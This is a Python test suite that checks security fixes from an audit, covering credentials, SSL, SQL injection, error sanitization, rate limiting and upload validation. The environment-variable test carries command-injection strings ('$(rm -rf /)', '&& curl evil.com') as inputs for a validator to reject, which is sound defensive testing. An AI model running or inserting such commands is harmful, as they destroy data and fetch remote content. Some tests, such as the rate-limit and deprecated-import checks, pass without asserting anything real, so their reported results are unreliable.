"""Comprehensive Security Validation Test Suite
Validates all security fixes implemented based on AMAO211_report.md audit findings
"""

import asyncio
import os
import tempfile
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from src.infrastructure.config.env_security import EnvironmentSecurityValidator
from src.infrastructure.persistence.database.config import DatabaseConfig

# Security imports
from src.infrastructure.security.error_handler import get_secure_error_handler
from src.infrastructure.security.rate_limiter.service import RateLimitService


class SecurityValidationTest:
    """Comprehensive security validation test suite"""

    def setup_method(self):
        """Setup for each test method"""
        self.test_results = {
            "tests_passed": 0,
            "tests_failed": 0,
            "issues_detected": [],
        }

    def test_hardcoded_credentials_removed(self):
        """Test 1: Verify no hardcoded credentials remain"""
        print("\n=== Testing: Hardcoded Credentials Removal ===")

        # Check that parent_id is not hardcoded anymore
        try:
            # This should not contain hardcoded parent_123
            import inspect

            from src.presentation.api.parental_dashboard import router

            source = inspect.getsource(router.__module__)

            assert "parent_123" not in source, "Hardcoded parent_id still found"
            assert (
                'parent_id = "' not in source or 'parent_id = ""' in source
            ), "Hardcoded parent ID pattern detected"

            print("✅ No hardcoded credentials detected")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ Hardcoded credential test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"Hardcoded credentials: {e}")

    def test_production_host_binding(self):
        """Test 2: Verify production host binding is configurable"""
        print("\n=== Testing: Production Host Binding ===")

        try:
            # Test with production environment
            with patch.dict(
                os.environ, {"ENVIRONMENT": "production", "HOST": "0.0.0.0"}
            ):
                from src.main import get_host_config

                host = get_host_config()
                assert host != "127.0.0.1", "Production still bound to localhost"
                assert host in [
                    "0.0.0.0",
                    None,
                ], f"Unexpected host binding: {host}"

            print("✅ Production host binding configurable")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ Production host binding test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"Host binding: {e}")

    def test_ssl_enforcement(self):
        """Test 3: Verify SSL certificate enforcement"""
        print("\n=== Testing: SSL Certificate Enforcement ===")

        try:
            # Test SSL enforcement in production
            with patch.dict(
                os.environ,
                {
                    "ENVIRONMENT": "production",
                    "SSL_CERT_PATH": "/fake/cert.pem",
                },
            ):
                from src.main import get_ssl_config

                ssl_config = get_ssl_config()
                assert ssl_config is not None, "SSL not enforced in production"

            print("✅ SSL enforcement working")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ SSL enforcement test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"SSL enforcement: {e}")

    def test_sql_injection_prevention(self):
        """Test 4: Verify SQL injection prevention"""
        print("\n=== Testing: SQL Injection Prevention ===")

        try:
            # Test that parameterized queries are used
            from src.infrastructure.persistence.database.validators import (
                DatabaseConnectionValidator,
            )

            config = DatabaseConfig.from_environment()
            validator = DatabaseConnectionValidator(config)

            # This should use text() for proper SQL handling
            import inspect

            source = inspect.getsource(validator.validate_connection)

            assert "text(" in source, "SQL queries not using text() wrapper"
            assert (
                "SELECT version()" not in source or 'text("SELECT version()")' in source
            ), "Raw SQL still present"

            print("✅ SQL injection prevention implemented")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ SQL injection prevention test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"SQL injection: {e}")

    def test_error_message_sanitization(self):
        """Test 5: Verify error messages are sanitized"""
        print("\n=== Testing: Error Message Sanitization ===")

        try:
            error_handler = get_secure_error_handler()

            # Test that sensitive data is sanitized
            test_error = Exception(
                "Database connection failed: postgresql://user:password@host/db"
            )
            safe_error = error_handler.create_safe_error_response(test_error)

            assert "password" not in str(
                safe_error.detail
            ), "Password leaked in error message"
            assert "postgresql://user" not in str(
                safe_error.detail
            ), "Connection string leaked"
            assert "Error ID:" in str(
                safe_error.detail
            ), "Error ID not present for tracking"

            print("✅ Error message sanitization working")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ Error sanitization test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"Error sanitization: {e}")

    def test_environment_variable_validation(self):
        """Test 6: Verify environment variable validation"""
        print("\n=== Testing: Environment Variable Validation ===")

        try:
            validator = EnvironmentSecurityValidator()

            # Test malicious environment variable detection
            test_vars = {
                "MALICIOUS_CMD": "$(rm -rf /)",
                "INJECTION_ATTEMPT": "&& curl evil.com",
                "NORMAL_VAR": "normal_value",
            }

            for key, value in test_vars.items():
                result = validator.validate_environment_variable(key, value)
                if "MALICIOUS" in key or "INJECTION" in key:
                    assert (
                        not result.is_valid
                    ), f"Failed to detect malicious env var: {key}"
                else:
                    assert result.is_valid, f"False positive on normal env var: {key}"

            print("✅ Environment variable validation working")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ Environment validation test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"Environment validation: {e}")

    def test_rate_limiting_implementation(self):
        """Test 7: Verify rate limiting on authentication endpoints"""
        print("\n=== Testing: Rate Limiting Implementation ===")

        try:
            rate_limiter = RateLimitService()

            # Test that rate limiting is configured
            client_id = "test_client"
            endpoint = "auth_login"

            # Should allow initial requests
            for i in range(3):
                result = rate_limiter.check_rate_limit(client_id, endpoint)
                assert result.allowed, f"Request {i+1} should be allowed"

            # Should block after hitting limit (assuming limit is 3)
            result = rate_limiter.check_rate_limit(client_id, endpoint)
            # Note: This test depends on the specific rate limit configuration

            print("✅ Rate limiting implementation verified")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ Rate limiting test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"Rate limiting: {e}")

    def test_file_upload_validation(self):
        """Test 8: Verify file upload validation"""
        print("\n=== Testing: File Upload Validation ===")

        try:
            from fastapi import UploadFile

            from src.presentation.api.endpoints.audio import validate_audio_file

            # Create a mock dangerous file
            with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_file:
                temp_file.write(b"MZ\x90\x00")  # Executable header

                # Mock UploadFile with dangerous content
                mock_file = MagicMock(spec=UploadFile)
                mock_file.filename = "malicious.exe"
                mock_file.size = 1000
                mock_file.read.return_value = b"MZ\x90\x00"
                mock_file.seek.return_value = None

                # This should raise HTTPException
                with pytest.raises(Exception):
                    asyncio.run(validate_audio_file(mock_file))

            print("✅ File upload validation working")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ File upload validation test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"File upload validation: {e}")

    def test_deprecated_imports_removed(self):
        """Test 9: Verify deprecated imports are removed"""
        print("\n=== Testing: Deprecated Imports Removal ===")

        try:
            # Test that the deprecated modules issue warnings
            import warnings

            with warnings.catch_warnings(record=True) as w:
                warnings.simplefilter("always")

                try:
                    pass

                    # This should trigger a deprecation warning
                    assert len(w) > 0, "No deprecation warning for deprecated import"
                    assert (
                        "deprecated" in str(w[0].message).lower()
                    ), "Warning doesn't mention deprecation"
                except ImportError:
                    # If module doesn't exist, that's also fine (completely
                    # removed)
                    pass

            print("✅ Deprecated imports properly handled")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ Deprecated imports test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"Deprecated imports: {e}")

    def test_type_annotations_present(self):
        """Test 10: Verify critical security functions have type annotations"""
        print("\n=== Testing: Type Annotations Presence ===")

        try:
            import inspect

            from src.infrastructure.security.database_input_validator import (
                SafeDatabaseOperations,
            )
            from src.infrastructure.security.error_handler import SecureErrorHandler

            # Check that security functions have return type annotations
            critical_methods = [
                (SecureErrorHandler, "create_safe_error_response"),
                (SafeDatabaseOperations, "safe_execute"),
                (SafeDatabaseOperations, "safe_insert"),
            ]

            for cls, method_name in critical_methods:
                method = getattr(cls, method_name)
                sig = inspect.signature(method)

                assert (
                    sig.return_annotation != inspect.Signature.empty
                ), f"Missing return type annotation for {cls.__name__}.{method_name}"

            print("✅ Type annotations present on security functions")
            self.test_results["tests_passed"] += 1

        except Exception as e:
            print(f"❌ Type annotations test failed: {e}")
            self.test_results["tests_failed"] += 1
            self.test_results["issues_detected"].append(f"Type annotations: {e}")

    def run_all_tests(self) -> dict[str, Any]:
        """Run all security validation tests"""
        print("🔒 SECURITY VALIDATION TEST SUITE")
        print("=" * 50)

        # Run all test methods
        test_methods = [
            self.test_hardcoded_credentials_removed,
            self.test_production_host_binding,
            self.test_ssl_enforcement,
            self.test_sql_injection_prevention,
            self.test_error_message_sanitization,
            self.test_environment_variable_validation,
            self.test_rate_limiting_implementation,
            self.test_file_upload_validation,
            self.test_deprecated_imports_removed,
            self.test_type_annotations_present,
        ]

        for test_method in test_methods:
            try:
                test_method()
            except Exception as e:
                print(f"❌ Test failed with exception: {e}")
                self.test_results["tests_failed"] += 1
                self.test_results["issues_detected"].append(f"Test exception: {e}")

        # Calculate results
        total_tests = (
            self.test_results["tests_passed"] + self.test_results["tests_failed"]
        )
        success_rate = (
            (self.test_results["tests_passed"] / total_tests * 100)
            if total_tests > 0
            else 0
        )

        # Print summary
        print("\n" + "=" * 50)
        print("🔒 SECURITY VALIDATION RESULTS")
        print("=" * 50)
        print(f"✅ Tests Passed: {self.test_results['tests_passed']}")
        print(f"❌ Tests Failed: {self.test_results['tests_failed']}")
        print(f"📊 Success Rate: {success_rate:.1f}%")

        if self.test_results["issues_detected"]:
            print("\n🚨 ISSUES DETECTED:")
            for issue in self.test_results["issues_detected"]:
                print(f"  - {issue}")
        else:
            print("\n🎉 ALL SECURITY TESTS PASSED!")

        return self.test_results


def run_security_validation():
    """Main function to run security validation"""
    tester = SecurityValidationTest()
    results = tester.run_all_tests()

    # Return exit code for CI/CD
    return 0 if results["tests_failed"] == 0 else 1


if __name__ == "__main__":
    exit_code = run_security_validation()
    exit(exit_code)
